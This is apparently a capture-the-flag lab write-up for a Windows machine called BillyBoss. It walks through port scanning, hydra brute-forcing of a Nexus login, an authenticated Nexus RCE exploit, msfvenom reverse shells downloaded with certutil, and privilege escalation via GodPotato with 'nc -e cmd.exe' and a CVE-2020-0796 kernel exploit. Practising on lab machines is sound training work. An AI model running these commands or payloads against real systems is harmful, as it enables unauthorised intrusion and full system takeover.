@@ -1,0 +1,210 @@
+																			                        BillyBoss Walkthrough
+																																							
+Attacker's Machine: 192.168.45.244
+Victim's Machine: 192.168.161.61
+export IP=192.168.155.61
+
+nmapAutomator.sh -H $IP -t Full
+
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
+|_http-title: BaGet
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+8081/tcp  open  http          Jetty 9.4.18.v20190429
+| http-robots.txt: 2 disallowed entries 
+|_/repository/ /service/
+|_http-server-header: Nexus/3.21.0-05 (OSS)
+|_http-title: Nexus Repository Manager
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows
+
+# Enumeration
+Nothing found for 21, 139,445
+
+# It seems that we have an exploit for port 8081 but we need credentials. Let's see if we get anything going from the other services.
+
+searchsploit sonatype                 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                                      |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)                                                                                                                          | java/webapps/49385.py
+
+
+# Enumerating port 8081
+
+dirb http://$IP:8081 /usr/share/wordlists/dirb/common.txt
+
++ http://192.168.161.61:8081/favicon.ico                                                                                                                                                     
++ http://192.168.161.61:8081/index.html                                                                                                                                                      
++ http://192.168.161.61:8081/robots.txt
+
+
+
+# Unfortunately, none of the directories reveal anything.
+    And nothing available for port 80 also. searchsploit baget       # nada
+    
+# Still no luck, let's try to brute force the login page available at pot 8081
+   Grab the request in burp and to the form of the request.
+   
+   
+   
+# It seems that for invalid credentials, the server responds with 403 Forbidden code and that our username and password are encoded in base64.
+   I've looked online for default credentials: found admin / admin123 as default credentials but their didn't work.
+   Notice that the endpoint is /service/rapture/session
+   
+# -I : ignore any restore files
+# -f : stop when a login is found
+# -L : username list
+# -P : password list
+# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values
+# C=/ tells hydra to establish session cookies at this URL
+# F=403 tells hydra that HTTP 403 means invalid login   
+
+hydra -I -f -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt 'http-post-form://192.168.161.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+
+# No luck. It's time to get desperate. Let's pull out cewl as last resort. :D. Generate two words, you never know, you might be lucky,
+
+cewl http://$IP -w cewl1.txt
+cewl http://$IP -w cewl2.txt --lowercase
+
+
+hydra -I -f -L cewl1.txt -P cewl1.txt 'http-post-form://192.168.161.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+
+# No hits with the first list. Let's go for the lowercase one.
+
+hydra -I -f -L cewl2.txt -P cewl2.txt 'http-post-form://192.168.161.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'   
+    
+
+
+# Nice, we found our credentials: nexus / nexus
+   Remember that we had the RCE Exploit available to us if we get credentials? Let's try it.
+   
+searchsploit -m java/webapps/49385.py
+
+curl http://192.168.45.244
+
+
+
+# Let's do a GET on our python server to see if the command execution works
+
+
+
+# Nice, it works, how let's transfer a shell on the system and execute it. Let's use a port already opened on the machine to avoid any issues with the firewall and shit.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.244 LPORT=8081 -f exe > shell-x64.exe
+
+certutil.exe -urlcache -split -f http://192.168.45.180/nc64.exe C:/Windows/Tasks/nc64.exe
+
+# Let's download our shell on the system
+
+
+
+certutil.exe -urlcache -split -f http://192.168.45.244/shell-x64.exe C:/Windows/Tasks/shell-x64.exe
+
+# Now, let's try to run it
+
+C:/Windows/Tasks/shell-x64.exe
+
+
+
+rlwrap nc -lvnp 8081
+
+
+
+# Nice we got shell, grab the flag and go for privesc.
+
+cd C:\Users\nathan\Desktop
+more local.txt
+30320c16272f43249887e09246335f56
+
+Privilege Escalation
+
+# Checking our the users
+
+cd C:\users
+dir
+Administrator
+BaGet
+nathan
+
+# We have another user present on the machine, BaGet, we might need to move laterally in order to get to the administrator account. We will see.
+
+whoami
+
+Privilege Name                                   Description                                                State   
+============================= ========================================= ========
+SeShutdownPrivilege                        Shut down the system                                Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                             Enabled 
+SeUndockPrivilege                            Remove computer from docking station        Disabled
+SeImpersonatePrivilege                     Impersonate a client after authentication       Enabled 
+SeCreateGlobalPrivilege                    Create global objects                                   Enabled 
+SeIncreaseWorkingSetPrivilege          Increase a process working set                     Disabled
+SeTimeZonePrivilege                         Change the time zone                                 Disabled
+
+# can this be so easy?
+
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)" /c:"System Boot Time" /c:"Windows Directory"
+
+Host Name:                      BILLYBOSS
+OS Name:                        Microsoft Windows 10 Pro
+OS Version:                     10.0.18362 N/A Build 18362
+System Boot Time:           2/17/2023, 9:28:14 AM
+System Type:                   x64-based PC
+Windows Directory:         C:\Windows
+Hotfix(s):                        6 Hotfix(s) Installed.
+Network Card(s):            1 NIC(s) Installed.
+
+# Aparently PrintSpoofer64.exe does not work on this version. So we need to find another potato exploit that works with this version.
+
+https://github.com/BeichenDream/GodPotato
+
+# Download the exploit on the machine together with a nc binary
+
+certutil.exe -urlcache -split -f http://192.168.45.244/nc64.exe nc.exe
+certutil.exe -urlcache -split -f http://192.168.45.244/potato.exe potato.exe
+
+# Execute the exploit to get another shell on port 443.
+
+potato.exe -cmd "C:/Users/nathan/Desktop/nc.exe 192.168.45.244 443 -e cmd.exe"
+
+cd C:\Users\Administrator\Desktop
+more proof.txt
+d265aa44c41fa364911a0d2103ecef05
+
+
+Compile https://github.com/danigargu/CVE-2020-0796
+
+Privilege escalation # 2 - Kernel Exploit
+
+[!] CVE-2020-0796 : VULNERABLE
+
+# Let's search online for this CVE
+
+https://github.com/danigargu/CVE-2020-0796
+
+# Download the zip file, extract it's contents open the .sln file in Visual Studio.
+   At line 204, replace the uint8_t shellcode[] value with the values of a new reverse shell payload generated with msfvenom
+   
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=21 -f dll -f csharp 
+
+# This will generate our payload in csharp format and we will have to paste it in our exploit.cpp file.
+
+        
+
+# In order to compile our executable, select Release, x64 and go to Build → Build Solution
+   Copy the executable on the machine and have a listener opened on port 21.
+   
+   
+   
+   
